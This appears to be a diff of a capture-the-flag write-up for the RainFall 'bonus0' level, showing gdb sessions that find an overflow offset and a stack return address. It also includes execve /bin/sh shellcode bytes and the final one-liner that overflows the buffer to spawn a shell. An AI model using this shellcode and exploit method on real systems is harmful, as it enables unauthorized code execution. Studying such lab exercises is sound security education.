@@ -1,3 +1,5 @@
+Our goal is Overflowing a buffer and Overwriting the return address with our shellcode address 
+
 ```
     (gdb) run
     Starting program: /home/user/bonus0/bonus0 
@@ -9,23 +11,9 @@
 
     Program received signal SIGSEGV, Segmentation fault.
     0x41336141 in ?? ()
-    (gdb) r
-    The program being debugged has been started already.
-    Start it from the beginning? (y or n) y
-    Starting program: /home/user/bonus0/bonus0 
-    - 
-    Aa0Aa1Aa2Aa3Aa4Aa5Aa
-    - 
-    6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A��� 6Aa7Aa8Aa9Ab0Ab1Ab2A���
-
-    Program received signal SIGSEGV, Segmentation fault.
-    0x30624139 in ?? ()
 ```
 
 we have a segmentation fault in 0x41336141 so the ofsset is 29
-
-
 
 ```
     (gdb) b p
@@ -78,8 +66,6 @@ we have a segmentation fault in 0x41336141 so the ofsset is 29
     0xbfffe710:     0x00000000      0x00000000      0x00000000      0x00000000
     (gdb) ni
     0x080484c0 in p ()
-    (gdb) nu
-    Undefined command: "nu".  Try "help".
     (gdb) ni
     0x080484c3 in p ()
     (gdb) ni
@@ -109,17 +95,18 @@ we have a segmentation fault in 0x41336141 so the ofsset is 29
     0xbfffe710:     0x00000000      0x00000000      0x00000000      0x00000000
 ```
 
-This 0xbfffe680 is the address where the program will continue after returning from pp().
-the return address is => 0xbfffe680 => \x80\xe6\xff\xbf
+This 0xbfffe710 is the address where the program will continue after returning from pp().
+the return address is => 0xbfffe710 => \x10\xe7\xff\xbf
 
 ```
 shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
 ```
 
 ```
+    (gdb) b p
+    Breakpoint 1 at 0x80484bd
     (gdb) run
     Starting program: /home/user/bonus0/bonus0 
-
     Breakpoint 1, 0x080484bd in p ()
     (gdb) ni
     0x080484c0 in p ()
@@ -137,27 +124,20 @@ shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\
     (gdb) ni
     0x080484e1 in p ()
     (gdb) ni
-    run < <(python -c 'print("A"* 28 + "\x90"* 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+    run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*100 + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
     0x080484e6 in p ()
     (gdb) x/40wx $ebp-0x1008
-    0xbfffe680:     0x206e7572      0x283c203c      0x68747970      0x2d206e6f
-    0xbfffe690:     0x70272063      0x746e6972      0x22412228      0x3832202a
-    0xbfffe6a0:     0x22202b20      0x3039785c      0x32202a22      0x2b203030
-    0xbfffe6b0:     0x785c2220      0x785c6136      0x785c6230      0x785c3835
-    0xbfffe6c0:     0x785c3939      0x785c3235      0x785c3836      0x785c6632
-    0xbfffe6d0:     0x785c6632      0x785c3337      0x785c3836      0x785c3836
-    0xbfffe6e0:     0x785c6632      0x785c3236      0x785c3936      0x785c6536
-    0xbfffe6f0:     0x785c3938      0x785c3365      0x785c3133      0x785c3963
-    0xbfffe700:     0x785c6463      0x29223038      0x000a2927      0x00000000
-    0xbfffe710:     0x00000000      0x00000000      0x00000000      0x00000000
+    0xbfffe680:     0x206e7572      0x283c203c      0x68747970      0x20336e6f
+    0xbfffe690:     0x2720632d      0x6f706d69      0x73207472      0x203b7379
+    0xbfffe6a0:     0x2e737973      0x6f647473      0x622e7475      0x65666675
+    0xbfffe6b0:     0x72772e72      0x28657469      0x785c2262      0x2a223039
+    0xbfffe6c0:     0x20303031      0x2262202b      0x6136785c      0x6230785c
+    0xbfffe6d0:     0x3835785c      0x3939785c      0x3235785c      0x3836785c
+    0xbfffe6e0:     0x6632785c      0x6632785c      0x3337785c      0x3836785c
+    0xbfffe6f0:     0x3836785c      0x6632785c      0x3236785c      0x3936785c
+    0xbfffe700:     0x6536785c      0x3938785c      0x3365785c      0x3133785c
+    0xbfffe710:     0x3963785c      0x6463785c      0x3038785c      0x29272922
 ```
-
-(python -c 'print("A"*29 + "\x80\xe6\xff\xbf" + "\x90" * 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")'; cat) | ./bonus0
-
-```
-    bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"';python -c 'print "A"* 9 + "\x10\xe7\xff\xbf" + "B" * 7'; cat) | ./bonus0
-```
-
 
 ```
     bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"';python -c 'print "A"* 9 + "\x10\xe7\xff\xbf" + "B" * 7'; cat) | ./bonus0 
